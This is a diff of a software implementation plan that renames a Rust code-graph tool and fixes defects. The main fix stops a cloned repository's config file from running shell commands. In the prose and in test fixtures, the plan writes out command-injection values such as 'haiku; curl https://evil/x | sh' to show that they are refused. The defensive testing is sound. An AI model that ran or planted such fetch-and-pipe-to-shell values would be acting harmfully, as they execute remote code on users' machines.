@@ -4,7 +4,7 @@
 
 **Goal:** Close the six items in `docs/bench/next-version-gaps.md` that are defects rather than measurements — a cloned repository that runs shell commands on the reader's machine, a generator failure graded as a completed run, a rebuild that hides its own next step, a `serve` that cannot bind under a deep path, a progress bar that misses its own cadence, and an instrument that cannot see an answer getting thinner — without moving a single recorded floor.
 
-**Architecture:** Every change is inside one Rust crate and additive to the store's format. Task 1 narrows what a project's `repograph.toml` is allowed to say and validates what it does say before it reaches `sh -c`. Task 2 makes `enrich` count an empty answer as a failure and exit non-zero when it wrote nothing. Task 3 makes a writer name the nodes it left without questions. Task 4 gives `serve` a socket path that fits in `SUN_LEN` and removes it on `SIGTERM`. Task 5 budgets the embed checkpoint by tokens instead of rows. Task 6 adds an anchor-completeness column and a `--repeat` median to `bench`, measurement only. Tasks are independent; the order is by severity.
+**Architecture:** Every change is inside one Rust crate and additive to the store's format. Task 1 narrows what a project's `zerograph.toml` is allowed to say and validates what it does say before it reaches `sh -c`. Task 2 makes `enrich` count an empty answer as a failure and exit non-zero when it wrote nothing. Task 3 makes a writer name the nodes it left without questions. Task 4 gives `serve` a socket path that fits in `SUN_LEN` and removes it on `SIGTERM`. Task 5 budgets the embed checkpoint by tokens instead of rows. Task 6 adds an anchor-completeness column and a `--repeat` median to `bench`, measurement only. Tasks are independent; the order is by severity.
 
 **Tech Stack:** Rust 2021 pinned by `rust-toolchain.toml` (1.98.0), dependencies `=`-pinned in `Cargo.toml`, no new crates except `libc` for Task 4's signal handler — and Task 4 states the alternative if a new dependency is refused. Tests are `#[cfg(test)]` modules beside the code, in the style already in `src/config.rs`, `src/enrich.rs` and `src/changes.rs`.
 
@@ -30,7 +30,7 @@
 - [ ] **Step 1: Fast-forward `main` and record the tip**
 
 ```bash
-git -C /Users/max/Documents/projects/repograph fetch origin && git -C /Users/max/Documents/projects/repograph checkout main && git -C /Users/max/Documents/projects/repograph merge --ff-only origin/main && git rev-parse --short HEAD
+git -C /Users/max/Documents/projects/zerograph fetch origin && git -C /Users/max/Documents/projects/zerograph checkout main && git -C /Users/max/Documents/projects/zerograph merge --ff-only origin/main && git rev-parse --short HEAD
 ```
 
 Expected: `1e185ed` or later. If the merge is not a fast-forward, stop and report — a local commit on `main` is not this plan's to rebase.
@@ -38,13 +38,13 @@ Expected: `1e185ed` or later. If the merge is not a fast-forward, stop and repor
 - [ ] **Step 2: Cut the branch**
 
 ```bash
-git -C /Users/max/Documents/projects/repograph checkout -b fix/critical-defects
+git -C /Users/max/Documents/projects/zerograph checkout -b fix/critical-defects
 ```
 
 - [ ] **Step 3: Prove the tree is green before any edit**
 
 ```bash
-cargo test --manifest-path /Users/max/Documents/projects/repograph/Cargo.toml
+cargo test --manifest-path /Users/max/Documents/projects/zerograph/Cargo.toml
 ```
 
 Expected: PASS. A red baseline is reported, not worked around.
@@ -61,7 +61,7 @@ Expected: PASS. A red baseline is reported, not worked around.
 
 **Interfaces:**
 - Produces: `fn model_token_is_safe(v: &str) -> bool` — true when `v` matches `^[A-Za-z0-9][A-Za-z0-9._:/@+-]*$` and is at most 128 bytes. Used by `Config::load` for both `enrich_model` and `rerank_model`, whatever layer they came from.
-- Produces: the rule that `enrich_command` and `rerank_command` in a **project** `repograph.toml` are refused with a line on stderr and the machine's (or built-in's) value used instead — the shape `embed_model` already has in the machine file, inverted.
+- Produces: the rule that `enrich_command` and `rerank_command` in a **project** `zerograph.toml` are refused with a line on stderr and the machine's (or built-in's) value used instead — the shape `embed_model` already has in the machine file, inverted.
 
 **Why this is first, and why it is bigger than the gap says.** G36 records one door: `enrich_command`/`rerank_command` are read from the project file, the project's key wins, and the command runs under `sh -c` on the first `enrich` or `ask --rerank` after a clone. Reading `src/config.rs:150-185` on `1e185ed` shows a second door nobody has written down. The built-in template is
 
@@ -69,7 +69,7 @@ Expected: PASS. A red baseline is reported, not worked around.
 MAX_THINKING_TOKENS=0 claude -p --model {model} --output-format text --tools "" --setting-sources "" --no-session-persistence
 ```
 
-and `{model}` is **unquoted**. `Config::load` ends with `cfg.enrich_command = enrich_template.replace(MODEL_SLOT, &cfg.enrich_model)`, and `enrich_model` is a key the project file may set. So a cloned repository whose `repograph.toml` says `enrich_model = "haiku; curl https://x/y | sh"` executes that on the first `enrich` **even after the command keys are refused**. Closing one door and leaving the other open is not a fix, so this task closes both: the command keys become machine-only, and the model token is validated wherever it comes from.
+and `{model}` is **unquoted**. `Config::load` ends with `cfg.enrich_command = enrich_template.replace(MODEL_SLOT, &cfg.enrich_model)`, and `enrich_model` is a key the project file may set. So a cloned repository whose `zerograph.toml` says `enrich_model = "haiku; curl https://x/y | sh"` executes that on the first `enrich` **even after the command keys are refused**. Closing one door and leaving the other open is not a fix, so this task closes both: the command keys become machine-only, and the model token is validated wherever it comes from.
 
 - [ ] **Step 1: Write the failing tests**
 
@@ -84,7 +84,7 @@ Add to `src/config.rs`'s `mod tests`, in the file's own style (every test that l
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
             std::fs::write(
-                dir.path().join("repograph.toml"),
+                dir.path().join("zerograph.toml"),
                 "enrich_command = \"curl https://evil/x | sh\"\nrerank_command = \"curl https://evil/y | sh\"\n",
             )
             .unwrap();
@@ -110,7 +110,7 @@ Add to `src/config.rs`'s `mod tests`, in the file's own style (every test that l
     fn a_model_name_that_could_end_the_command_is_refused() {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "enrich_model = \"haiku; curl https://evil/x | sh\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "enrich_model = \"haiku; curl https://evil/x | sh\"\n").unwrap();
             let cfg = Config::load(dir.path()).unwrap();
             assert_eq!(cfg.enrich_model, "haiku", "the built-in stands when the file's token is not one");
             assert!(!cfg.enrich_command.contains("evil"), "{}", cfg.enrich_command);
@@ -121,7 +121,7 @@ Add to `src/config.rs`'s `mod tests`, in the file's own style (every test that l
     fn a_model_name_that_is_a_token_passes_whatever_its_vendor() {
         with_machine(None, || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "enrich_model = \"qwen2.5-coder:7b\"\n").unwrap();
+            std::fs::write(dir.path().join("zerograph.toml"), "enrich_model = \"qwen2.5-coder:7b\"\n").unwrap();
             let cfg = Config::load(dir.path()).unwrap();
             assert_eq!(cfg.enrich_model, "qwen2.5-coder:7b");
             assert!(cfg.enrich_command.contains("--model qwen2.5-coder:7b"), "{}", cfg.enrich_command);
@@ -146,7 +146,7 @@ In `Config::load`, the project's named keys are already collected into `named`. 
         // than silence, so a repository that expects its own transport learns why it did not run.
         for key in ["enrich_command", "rerank_command"] {
             if named.contains_key(key) {
-                let _ = writeln!(std::io::stderr(), "repograph.toml: {key} is not read from a repository — set it in the machine file ({}) if this is a transport you chose", machine_path().map(|p| p.display().to_string()).unwrap_or_else(|| "~/.config/repograph/config.toml".into()));
+                let _ = writeln!(std::io::stderr(), "zerograph.toml: {key} is not read from a repository — set it in the machine file ({}) if this is a transport you chose", machine_path().map(|p| p.display().to_string()).unwrap_or_else(|| "~/.config/zerograph/config.toml".into()));
             }
         }
         let template = |key: &str, from_machine: Option<String>, builtin: &str| -> String {
@@ -173,12 +173,12 @@ fn model_token_is_safe(v: &str) -> bool {
 }
 ```
 
-and apply it in `Config::load` after the layering and the two `REPOGRAPH_*_MODEL` environment reads, immediately before the two `replace(MODEL_SLOT, …)` lines:
+and apply it in `Config::load` after the layering and the two `ZEROGRAPH_*_MODEL` environment reads, immediately before the two `replace(MODEL_SLOT, …)` lines:
 
 ```rust
         for (name, slot, builtin) in [("enrich_model", &mut cfg.enrich_model, ENRICH_MODEL), ("rerank_model", &mut cfg.rerank_model, RERANK_MODEL)] {
             if !model_token_is_safe(slot) {
-                let _ = writeln!(std::io::stderr(), "repograph: {name} = {slot:?} is not a model name — using {builtin}");
+                let _ = writeln!(std::io::stderr(), "zerograph: {name} = {slot:?} is not a model name — using {builtin}");
                 *slot = builtin.to_string();
             }
         }
@@ -322,10 +322,10 @@ Expected: PASS.
 - [ ] **Step 7: Prove the exit status by hand**
 
 ```bash
-cd $(mktemp -d) && git init -q . && mkdir -p docs && printf '### FR-X-1 · t\n\nbody\n' > docs/a.md && /Users/max/Documents/projects/repograph/target/debug/repograph build --no-dense >/dev/null 2>&1; REPOGRAPH_CONFIG=/dev/null /Users/max/Documents/projects/repograph/target/debug/repograph enrich --no-dense --batch 8 --parallel 1; echo "exit=$?"
+cd $(mktemp -d) && git init -q . && mkdir -p docs && printf '### FR-X-1 · t\n\nbody\n' > docs/a.md && /Users/max/Documents/projects/zerograph/target/debug/zerograph build --no-dense >/dev/null 2>&1; ZEROGRAPH_CONFIG=/dev/null /Users/max/Documents/projects/zerograph/target/debug/zerograph enrich --no-dense --batch 8 --parallel 1; echo "exit=$?"
 ```
 
-Expected: `exit=1` with the bail line, after `cargo build` has produced the binary. (The default command is `claude -p`; if `claude` is on PATH and answers, set a stub first with `REPOGRAPH_CONFIG` pointing at a machine file whose `enrich_command = "false | cat"`.)
+Expected: `exit=1` with the bail line, after `cargo build` has produced the binary. (The default command is `claude -p`; if `claude` is on PATH and answers, set a stub first with `ZEROGRAPH_CONFIG` pointing at a machine file whose `enrich_command = "false | cat"`.)
 
 - [ ] **Step 8: Update the ledger and commit**
 
@@ -394,7 +394,7 @@ In `src/main.rs`, in both the `Build` and `Update` arms after the graph is saved
 
 ```rust
             if let Some(n) = enrich::unenriched_note(&graph, &enrich::Questions::load(&store)?) {
-                eprintln!("repograph: {n} requirement-like nodes have no questions — run `repograph enrich` to search them");
+                eprintln!("zerograph: {n} requirement-like nodes have no questions — run `zerograph enrich` to search them");
             }
 ```
 
@@ -405,7 +405,7 @@ Expected: PASS.
 
 - [ ] **Step 5: Say it in the README**
 
-One sentence in the Embeddings section: a rebuild under a corpus that grew adds nodes `enrich` has never seen, and the writer prints how many; the fix is `repograph enrich`.
+One sentence in the Embeddings section: a rebuild under a corpus that grew adds nodes `enrich` has never seen, and the writer prints how many; the fix is `zerograph enrich`.
 
 - [ ] **Step 6: Commit**
 
@@ -423,7 +423,7 @@ git add src/enrich.rs src/main.rs README.md && git commit -m "fix(enrich): a reb
 - Test: `src/serve.rs`'s own `mod tests`
 
 **Interfaces:**
-- Produces: `pub fn socket_path(repo: &Path) -> PathBuf` — unchanged signature. Returns `<repo>/.repograph/serve.sock` when that path is at most 100 bytes, else `<tmp>/repograph-<16 hex of the canonical repo path>.sock`. Both the server and the client call it, so they cannot disagree.
+- Produces: `pub fn socket_path(repo: &Path) -> PathBuf` — unchanged signature. Returns `<repo>/.zerograph/serve.sock` when that path is at most 100 bytes, else `<tmp>/zerograph-<16 hex of the canonical repo path>.sock`. Both the server and the client call it, so they cannot disagree.
 
 **Why 100 and not 104.** `sockaddr_un.sun_path` is 104 bytes on macOS **including** the terminating NUL; 108 on Linux. 100 leaves the margin and is one number on every platform, which is worth more here than four bytes.
 
@@ -435,7 +435,7 @@ git add src/enrich.rs src/main.rs README.md && git commit -m "fix(enrich): a reb
         let deep = std::path::PathBuf::from("/private/tmp").join("a".repeat(120));
         let p = socket_path(&deep);
         assert!(p.as_os_str().len() <= 100, "{}", p.display());
-        assert!(p.file_name().unwrap().to_string_lossy().starts_with("repograph-"));
+        assert!(p.file_name().unwrap().to_string_lossy().starts_with("zerograph-"));
         // The same repository always gets the same name, or the client cannot find the server.
         assert_eq!(socket_path(&deep), p);
         // A different repository gets a different one.
@@ -445,7 +445,7 @@ git add src/enrich.rs src/main.rs README.md && git commit -m "fix(enrich): a reb
     #[test]
     fn a_shallow_repository_keeps_the_socket_it_has_always_had() {
         let p = socket_path(std::path::Path::new("/tmp/r"));
-        assert!(p.ends_with(".repograph/serve.sock"), "{}", p.display());
+        assert!(p.ends_with(".zerograph/serve.sock"), "{}", p.display());
     }
 ```
 
@@ -457,12 +457,12 @@ Expected: FAIL — the deep path's socket is 140-odd bytes.
 - [ ] **Step 3: Implement the fallback**
 
 ```rust
-/// `<repo>/.repograph/serve.sock`, which is where a person looks for it — unless the name will not
+/// `<repo>/.zerograph/serve.sock`, which is where a person looks for it — unless the name will not
 /// fit in `sun_path` (104 bytes on macOS, including the NUL), in which case a name derived from the
 /// canonical repository path goes in the temporary directory. Server and client both come here, so
 /// the fallback is never half-taken.
 pub fn socket_path(repo: &Path) -> PathBuf {
-    let in_repo = repo.join(".repograph").join("serve.sock");
+    let in_repo = repo.join(".zerograph").join("serve.sock");
     if in_repo.as_os_str().len() <= 100 { return in_repo; }
     let canonical = std::fs::canonicalize(repo).unwrap_or_else(|_| repo.to_path_buf());
     let mut h: u64 = 0xcbf2_9ce4_8422_2325;
@@ -470,7 +470,7 @@ pub fn socket_path(repo: &Path) -> PathBuf {
         h ^= u64::from(*b);
         h = h.wrapping_mul(0x1000_0000_01b3);
     }
-    std::env::temp_dir().join(format!("repograph-{h:016x}.sock"))
+    std::env::temp_dir().join(format!("zerograph-{h:016x}.sock"))
 }
 ```
 
@@ -502,13 +502,13 @@ Run: `cargo test --manifest-path Cargo.toml serve::tests`
 Expected: PASS.
 
 ```bash
-D=$(mktemp -d)/$(python3 -c "print('d/'*40)") && mkdir -p "$D" && cp -R ~/bench/beauty-crm-502e8a6d/.repograph "$D/" && cd "$D" && /Users/max/Documents/projects/repograph/target/debug/repograph serve --idle 30 & sleep 3; /Users/max/Documents/projects/repograph/target/debug/repograph --repo "$D" --no-dense ask --stale отмена записи | head -3
+D=$(mktemp -d)/$(python3 -c "print('d/'*40)") && mkdir -p "$D" && cp -R ~/bench/beauty-crm-502e8a6d/.repograph "$D/" && cd "$D" && /Users/max/Documents/projects/zerograph/target/debug/zerograph serve --idle 30 & sleep 3; /Users/max/Documents/projects/zerograph/target/debug/zerograph --repo "$D" --no-dense ask --stale отмена записи | head -3
 ```
 
 Expected: the answer arrives; before this task it fails with a bind error naming `sun_path`.
 
 ```bash
-pkill -TERM -f "repograph serve" ; sleep 1; ls "$TMPDIR"/repograph-*.sock 2>/dev/null; echo "leftover=$?"
+pkill -TERM -f "zerograph serve" ; sleep 1; ls "$TMPDIR"/zerograph-*.sock 2>/dev/null; echo "leftover=$?"
 ```
 
 Expected: `leftover=1` (no such file).
@@ -602,7 +602,7 @@ Expected: PASS.
 - [ ] **Step 6: Measure the cadence on a copy**
 
 ```bash
-cp -R ~/bench/beauty-crm-502e8a6d /private/tmp/g19-copy && cd /private/tmp/g19-copy && rm -rf .repograph/dense && /usr/bin/time -l /Users/max/Documents/projects/repograph/target/release/repograph embed 2>&1 | ts -s "%.s" | tee /private/tmp/g19-cadence.txt | tail -5
+cp -R ~/bench/beauty-crm-502e8a6d /private/tmp/g19-copy && cd /private/tmp/g19-copy && rm -rf .zerograph/dense && /usr/bin/time -l /Users/max/Documents/projects/zerograph/target/release/zerograph embed 2>&1 | ts -s "%.s" | tee /private/tmp/g19-cadence.txt | tail -5
 ```
 
 If `ts` is not installed, pipe through `awk '{ "date +%s.%N" | getline t; close("date +%s.%N"); print t, $0 }'`. Then read the intervals:
@@ -674,7 +674,7 @@ Expected: PASS.
 - [ ] **Step 6: Record the baseline on all four arms**
 
 ```bash
-cd ~/bench/beauty-crm-502e8a6d && for arm in "--no-dense" ""; do for cases in bench/cases.jsonl bench/dev-cases.jsonl; do /Users/max/Documents/projects/repograph/target/release/repograph $arm bench --cases "$cases" | tail -2; done; done | tee /private/tmp/g15-baseline.txt
+cd ~/bench/beauty-crm-502e8a6d && for arm in "--no-dense" ""; do for cases in bench/cases.jsonl bench/dev-cases.jsonl; do /Users/max/Documents/projects/zerograph/target/release/zerograph $arm bench --cases "$cases" | tail -2; done; done | tee /private/tmp/g15-baseline.txt
 ```
 
 Expected: every count and every p90 identical to the recorded arms; the anchor totals are new and are the baseline. Write them into `docs/bench/next-version-gaps.md` under G15 with the commit they were read at.
@@ -696,7 +696,7 @@ git add src/bench.rs src/main.rs docs/bench/runbook.md docs/bench/next-version-g
 - [ ] **Step 1: Run the full suite and the lint**
 
 ```bash
-cargo test --manifest-path /Users/max/Documents/projects/repograph/Cargo.toml && cargo clippy --manifest-path /Users/max/Documents/projects/repograph/Cargo.toml --all-targets -- -D warnings
+cargo test --manifest-path /Users/max/Documents/projects/zerograph/Cargo.toml && cargo clippy --manifest-path /Users/max/Documents/projects/zerograph/Cargo.toml --all-targets -- -D warnings
 ```
 
 - [ ] **Step 2: Run the code review at the level the router picks**
